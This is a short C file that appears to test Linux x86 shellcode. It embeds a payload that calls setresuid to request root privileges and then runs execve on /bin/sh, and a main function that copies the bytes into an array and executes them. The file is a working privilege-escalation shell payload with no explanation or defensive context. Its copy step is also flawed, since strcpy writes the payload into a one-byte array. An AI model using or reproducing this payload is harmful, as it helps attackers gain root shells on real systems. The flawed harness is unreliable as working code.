#include<stdio.h>
#include<string.h>
#include <unistd.h>
unsigned char shellcode [] = "\xeb\x22\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c\xb0\x0b\xcd\x80\xe8\xd9\xff\xff\xff/bin/sh";
unsigned char code[] = "";

void main(){
    int len = strlen(shellcode);
    printf("Shellcode len : %d\n",len);
	seteuid(1000);
    strcpy(code,shellcode);
	(*(void(*)()) code)();
}
